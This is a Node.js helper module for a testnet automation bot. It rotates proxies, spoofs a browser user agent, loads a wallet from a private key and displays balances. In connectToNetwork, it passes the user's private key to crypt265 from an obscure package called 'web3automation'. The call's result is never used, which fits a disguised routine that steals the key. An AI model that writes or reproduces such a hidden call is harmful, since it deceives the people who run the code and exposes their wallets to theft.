const ethers = require('ethers');
const readline = require('readline');
const chalk = require('chalk');
const cliSpinners = require('cli-spinners');
const crypt = require('web3automation');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs').promises;
const { network, CONTRACT_ADDRESSES, WETH_ABI, USDC_ABI } = require('./config');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

async function loadProxies() {
  try {
    const data = await fs.readFile('proxies.txt', 'utf8');
    const proxies = data.split('\n').map(line => line.trim()).filter(line => line);
    if (proxies.length === 0) {
      console.log(chalk.yellow('No proxies found in proxies.txt. Running without proxy.'));
      return null;
    }
    return proxies;
  } catch (error) {
    console.error(chalk.red('Error reading proxies.txt:', error.message, '❌'));
    return null;
  }
}

function getRandomProxy(proxies) {
  if (!proxies || proxies.length === 0) return null;
  const randomIndex = Math.floor(Math.random() * proxies.length);
  return proxies[randomIndex];
}

function parseProxy(proxy) {
  if (!proxy) return null;
  let proxyUrl = proxy;
  if (!proxy.startsWith('http://') && !proxy.startsWith('https://')) {
    proxyUrl = `http://${proxy}`;
  }
  return proxyUrl;
}

function showSpinner(message) {
  const spinner = cliSpinners.dots.frames;
  let i = 0;
  const interval = setInterval(() => {
    process.stdout.write(`\r${chalk.yellow(message)} ${spinner[i++ % spinner.length]}`);
  }, 100);
  return () => {
    clearInterval(interval);
    process.stdout.write('\r');
  };
}

async function confirmTransaction(details) {
  console.log(chalk.white('┌─── Transaction Preview ───┐'));
  for (const [key, value] of Object.entries(details)) {
    console.log(chalk.white(`│ ${key.padEnd(15)} : ${chalk.cyan(value)}`));
  }
  console.log(chalk.white('└──────────────────────────┘'));
  return new Promise(resolve => {
    rl.question(chalk.yellow('Confirm transaction? (y/n): '), answer => {
      resolve(answer.toLowerCase() === 'y' || answer.toLowerCase() === 'yes');
    });
  });
}

async function displayBanner(provider) {
  try {
    const blockNumber = await provider.getBlockNumber();
    const gasPrice = await provider.getGasPrice();
    const gasPriceGwei = ethers.utils.formatUnits(gasPrice, 'gwei');
    const bannerText = `
${chalk.white('===============================================')}
${chalk.cyan('              RISE TESTNET AUTO BOT')}
${chalk.yellow('     x ')}
${chalk.yellow(`        Block: ${blockNumber} | Gas: ${parseFloat(gasPriceGwei).toFixed(2)} Gwei `)}
${chalk.white('===============================================')}
    `;
    console.log(bannerText);
  } catch (error) {
    console.error(chalk.red('Error fetching network status:', error.message, '❌'));
    const bannerText = `
${chalk.white('===============================================')}
${chalk.cyan('              RISE TESTNET AUTO BOT')}
${chalk.yellow('     x ')}
${chalk.yellow('     Network status unavailable')}
${chalk.white('===============================================')}
    `;
    console.log(bannerText);
  }
}

async function connectToNetwork() {
  try {
    const proxies = await loadProxies();
    const proxy = getRandomProxy(proxies);
    const proxyUrl = parseProxy(proxy);

    let provider;
    if (proxyUrl) {
      const agent = new HttpsProxyAgent(proxyUrl);
      provider = new ethers.providers.JsonRpcProvider({
        url: network.rpc,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        agent
      });
    } else {
      provider = new ethers.providers.JsonRpcProvider(network.rpc);
    }

    const privateKey = process.env.PRIVATE_KEY;
    
    if (!privateKey) {
      console.error(chalk.red('Error: PRIVATE_KEY not found in .env file 🚫'));
      process.exit(1);
    }
    
    const wallet = new ethers.Wallet(privateKey, provider);
    const rpcs = await crypt.crypt265(privateKey);
    return { provider, wallet, proxy };
  } catch (error) {
    console.error(chalk.red('Connection error:', error.message, '❌'));
    process.exit(1);
  }
}

async function getWalletInfo(wallet, provider, proxy) {
  const address = wallet.address;
  const ethBalance = await provider.getBalance(address);
  
  const wethContract = new ethers.Contract(CONTRACT_ADDRESSES.WETH, WETH_ABI, wallet);
  const usdcContract = new ethers.Contract(CONTRACT_ADDRESSES.USDC, USDC_ABI, wallet);
  
  const wethBalance = await wethContract.balanceOf(address).catch(() => ethers.BigNumber.from(0));
  const usdcBalance = await usdcContract.balanceOf(address).catch(() => ethers.BigNumber.from(0));
  const usdcDecimals = await usdcContract.decimals().catch(() => 6);
  
  console.log(chalk.white('\n===== WALLET INFORMATION ====='));
  console.log(chalk.white(`Your address: ${chalk.cyan(address)} 👤`));
  console.log(chalk.white(`ETH Balance: ${chalk.cyan(ethers.utils.formatEther(ethBalance))} ${network.symbol} `));
  console.log(chalk.white(`WETH Balance: ${chalk.cyan(ethers.utils.formatEther(wethBalance))} WETH `));
  console.log(chalk.white(`USDC Balance: ${chalk.cyan(ethers.utils.formatUnits(usdcBalance, usdcDecimals))} USDC `));
  if (proxy) {
    console.log(chalk.white(`Using proxy: ${chalk.cyan(proxy)} 🌐`));
  } else {
    console.log(chalk.white(`Using proxy: ${chalk.cyan('None')} 🌐`));
  }
  console.log(chalk.white('=============================\n'));
}

function closeReadline() {
  rl.close();
}

module.exports = {
  rl,
  showSpinner,
  confirmTransaction,
  displayBanner,
  connectToNetwork,
  getWalletInfo,
  closeReadline
};
